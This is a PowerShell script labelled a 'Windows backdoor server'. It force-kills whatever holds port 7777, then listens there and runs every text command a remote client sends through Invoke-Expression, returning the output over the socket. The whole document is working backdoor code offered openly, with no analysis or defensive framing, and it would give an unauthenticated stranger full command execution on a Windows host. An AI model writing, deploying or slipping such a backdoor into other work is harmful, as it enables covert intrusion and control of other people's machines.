# Windows backdoor server

# Set up variables
$defaultAccessPort = 7777
$defaultBufferSize = 4096

# Define the function to handle the backdoor client
function handleBackdoorClientRequest {
    param (
        [System.Net.Sockets.NetworkStream]$clientSocketConnection
    )

    $buffer = New-Object byte[] $defaultBufferSize
    $bytesRead = 0

    while ($true) {
        # Receive data from the client
        $bytesRead = $clientSocketConnection.Read($buffer, 0, $defaultBufferSize)
        if ($bytesRead -eq 0) {
            Write-Host "Client disconnected"
            if ($clientSocketConnection -ne $null) {
                $clientSocketConnection.Close()
            }
            return
        }

        # Convert the received data to string
        $receivedData = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)

        # Execute the command received from the client via Invoke-Expression
        try {
            [string] $commandOutput = Invoke-Expression $receivedData
            Write-Host "Command executed: $receivedData => $commandOutput"
        } catch {
            $errorMessage = "Error executing the command: $_"
            if ($clientSocketConnection -ne $null) {
                $clientSocketConnection.Write([System.Text.Encoding]::ASCII.GetBytes($errorMessage), 0, $errorMessage.Length)
            }
            continue
        }

        # Convert the command output to bytes
        $commandOutputBytes = [System.Text.Encoding]::ASCII.GetBytes($commandOutput)

        # Send the output of the command to the client, appending a newline
        if ($clientSocketConnection -ne $null) {
            $clientSocketConnection.Write($commandOutputBytes + [System.Text.Encoding]::ASCII.GetBytes("\n"), 0, $commandOutputBytes.Length + 1)
        }
    }
}

function Main {
    # Find and kill processes using the specified port
    $listeningProcesses = Get-NetTCPConnection -LocalPort $defaultAccessPort -ErrorAction SilentlyContinue
    if ($null-ne $listeningProcesses) {
        Write-Host "Processes using port $defaultAccessPort found. Killing processes..."
        $listeningProcesses | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }
        Write-Host "Processes killed."
    }

    # Set up the listener socket
    $listener = [System.Net.Sockets.TcpListener]$defaultAccessPort
    
    # Start listening for incoming connections
    $listener.Start()
    Write-Host "Listening for incoming connection (port: $defaultAccessPort)..."

    while ($true) {
        if ($listener.Pending()) {
            # Accept a new client connection
            $connection = $listener.AcceptTcpClient()
            $connectionStream = $connection.GetStream()

            # Print the client IP address and port number if a new client connects
            if ($connection.Connected) {
                $connectionEndPoint = $connection.Client.RemoteEndPoint
                Write-Host "Client connected: $($connectionEndPoint.Address):$($connectionEndPoint.Port)"

                # Handle the backdoor client
                handleBackdoorClientRequest -clientSocketConnection $connectionStream
            }
        }
    }

    # Cleanup
    $listener.Stop()
}

Main
